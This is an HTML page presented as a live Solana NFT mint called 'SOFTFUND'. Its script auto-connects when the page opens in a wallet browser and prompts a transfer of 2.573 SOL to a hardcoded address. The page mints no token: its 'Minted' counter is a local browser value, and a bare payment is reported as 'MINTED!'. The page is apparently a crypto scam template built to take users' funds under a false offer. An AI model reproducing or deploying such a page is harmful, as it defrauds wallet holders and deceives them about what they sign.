<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND – Mint Live</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      background:linear-gradient(135deg,#0a001f,#1b0044,#2e0055);
      color:#fff;font-family:'Orbitron',sans-serif;
      min-height:100vh;display:flex;align-items:center;justify-content:center;
      padding:20px;
    }
    .container{max-width:420px;width:100%}
    h1{font-size:2.8rem;color:#00ff9d;margin-bottom:4px}
    .tag{font-size:1rem;color:#aaa;margin-bottom:12px}
    .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:12px 0}
    .stats{font-size:1rem;color:#ccc;margin-bottom:16px}
    button{
      width:100%;max-width:340px;margin:8px auto;padding:16px;
      font-size:1.4rem;background:#ffd700;color:#000;border:none;
      border-radius:14px;cursor:pointer;font-weight:bold;
      box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
    }
    button:hover{background:#ffed4e;transform:scale(1.04)}
    .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
    .loader{display:inline-block;width:12px;height:12px;border:2px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:4px;}
    @keyframes s{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p class="tag">USA-Based • Solana Utility NFTs</p>
    <p class="price">2.5730 SOL</p>
    <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>

    <button onclick="showWallets()">CHOOSE WALLET</button>

    <div id="wallets" style="display:none;">
      <button onclick="openPhantom()">Phantom</button>
      <button onclick="openTrust()">Trust Wallet</button>
      <button onclick="openMetamask()">MetaMask</button>
    </div>

    <div id="status" class="status"></div>
  </div>

  <script>
    const PRICE = 2.5730 * 1e9;
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    let count = localStorage.getItem('softfund') || 0;
    document.getElementById('minted').textContent = count;

    function status(txt, color) {
      document.getElementById('status').innerHTML = txt;
      document.getElementById('status').style.color = color;
    }

    function showWallets() {
      document.querySelector('button').style.display = 'none';
      document.getElementById('wallets').style.display = 'block';
    }

    // === PHANTOM: Open IN APP + auto-connect + pay ===
    function openPhantom() {
      status("Opening Phantom... <span class='loader'></span>", "#ffd700");
      const url = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href) + "?ref=" + encodeURIComponent(location.href);
      location.href = url;
    }

    // === TRUST: Open page inside Trust browser ===
    function openTrust() {
      status("Opening Trust Wallet... <span class='loader'></span>", "#ffd700");
      location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(location.href);
    }

    // === METAMASK: Open page inside MetaMask browser ===
    function openMetamask() {
      status("Opening MetaMask... <span class='loader'></span>", "#ffd700");
      location.href = "https://metamask.app.link/dapp/" + location.host + location.pathname;
    }

    // === AUTO-MINT WHEN PAGE LOADS IN WALLET ===
    window.addEventListener("load", () => {
      setTimeout(() => {
        if (window.solana || window.trustwallet || window.ethereum) {
          mintNow();
        }
      }, 1000);
    });

    async function mintNow() {
      status("Connecting... <span class='loader'></span>", "#ffd700");
      let provider = window.solana || window.trustwallet?.Provider?.solana || window.ethereum;

      if (!provider) return status("Wallet not found", "#ff5555");

      try {
        if (!provider.isConnected) await provider.connect();
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
            lamports: PRICE,
          })
        );
        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = provider.publicKey;

        const signed = await provider.signTransaction(tx);
        const sig = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(sig);

        count++; localStorage.setItem('softfund', count);
        document.getElementById('minted').textContent = count;
        status(`MINTED! <a href="https://solscan.io/tx/${sig}" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
      } catch (e) {
        status("Failed – try again", "#ff5555");
      }
    }
  </script>
  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
</body>
</html>
